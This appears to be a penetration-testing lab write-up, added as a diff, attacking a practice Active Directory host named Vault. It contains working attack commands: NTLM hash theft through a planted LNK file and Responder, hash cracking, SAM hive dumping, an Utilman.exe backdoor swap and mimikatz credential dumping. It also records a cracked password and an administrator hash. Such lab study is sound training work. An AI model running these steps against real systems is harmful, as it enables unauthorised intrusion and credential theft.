@@ -1,0 +1,144 @@
+### Enumeration
+```
+IP=192.168.200.172
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p53,88,135,139,389,445,464,593,636,3269,3269,5985,9389,49666,49667,49673,49674,49677,49704 -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 53
+	- Simple DNS Plus
+- 88
+	- kerberos 
+- 135
+	- RPC
+- 139
+	- RPC
+- 389
+	- Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+- 445
+	- smb
+- 464
+	- kpasswd5
+- 593
+	- ROC
+- 636
+	- rcpwrapped
+- 3268
+	- Microsoft Windows Active Directory LDAP (Domain: vault.offsec0., Site: Default-First-Site-Name)
+- 3269
+	- rcpwrapped
+- 3389
+	- Microsoft Terminal Services
+- 5985
+	- Microsoft HTTPAPI
+- 9389
+	- .NET Message Framing
+- 49666
+	- RPC
+- 49667
+	- RPC
+- 49673
+	- RPC
+- 49674
+	- RPC
+- 49677
+	- RPC
+- 49704
+	- RPC
+### Foothold
+- RPC/ SMB
+	- enum4linux $IP
+		- Nothing
+- 445
+	- smbclient -N -L //$IP
+		- ADMIN$
+			- Access denied
+		- C$
+			- Access denied
+		- DocumentsShare
+			- Anonymous success
+			- No files
+		- IPC$
+			- Anonymous success
+			- No files
+		- NETLOGON
+			- Access denied
+		- SYSVOL
+			- Access denied
+	- nmap --script smb-vuln* -p135,139,445 $IP
+		- nothing
+	- crackmapexec smb $IP -u guest -p "" --rid-brute
+		- guest
+		- administrator
+		- krbtgt
+		- anirudh
+- kerberos
+	- ./kerbrute_linux_amd64 bruteuser -d vault.offsec --dc 192.168.200.172 /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt anirudh
+		- Failed
+- LNK
+	- ntlm theft
+		- python3 ntlm_theft.py -g lnk -s 192.168.45.178 -f vault
+		- put into smb share
+	- sudo responder -I tun0
+		- received ntlmv2 hash
+		- hashcat -m 5600 anirudh /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
+			- SecureHM
+- LDAP
+	- ldapsearch -H ldap://192.168.200.172 -x -b "DC=vault,DC=offsec"
+		- Nothing
+- sudo crackmapexec smb  $IP -u 'anirudh' -p SecureHM --shares
+	- C$ writable
+- impacket-psexec vault.offsec/anirudh:'SecureHM'@192.168.200.172
+	- failed
+- evil-winrm -i 192.168.200.172 -u anirudh -p 'SecureHM'
+	- successful login
+### PE
+#### Windows
+- anirudh
+	- whoami /all
+		- SeMachineAccountPrivilege Enabled
+		- SeSystemtimePrivilege Enabled
+		- SeBackupPrivilege Enabled
+			- reg save hklm\sam C:\Users\anirudh\sam.bak
+			- reg save hklm\system C:\Users\anirudh\system.bak
+			- Download to kali
+			- impacket-secretsdump -sam sam.bak -system system.bak LOCAL
+			- administrator:608339ddc8f434ac21945e026887dc36
+		- SeRestorePrivilege Enabled
+			- mv /Windows/System32/Utilman.exe /Windows/System32/Utilman.old
+			- mv /Windows/System32/cmd.exe /Windows/System32/Utilman.exe
+			- shutdown /r /f /t 0
+			- Reconnect
+			- Windows key + U = admin cmd
+		- SeShutdownPrivilege Enabled
+		- SeChangeNotifyPrivilege Enabled
+		- SeRemoteShutdownPrivilege Enabled
+		- SeTimeZonePrivilege Enabled
+	- systeminfo
+		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
+	- history
+		- (Get-PSReadLineOption).HistorySavePath
+	- Users with console
+		- Administrator, Guest, krbtgt, anirudh
+	- Services
+		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
+		- Unquoted
+			- cmd
+				- wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+			- PS1
+				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+			- icacls Filepath before .exe
+				- Looking for W or F
+	- netstat -ano
+		- Active ports
+	- mimkatz
+		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+			- no privs
+		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+			- no privs
+### Credentials
+- `VAULT\anirudh:SecureHM
+### Lessons Learned
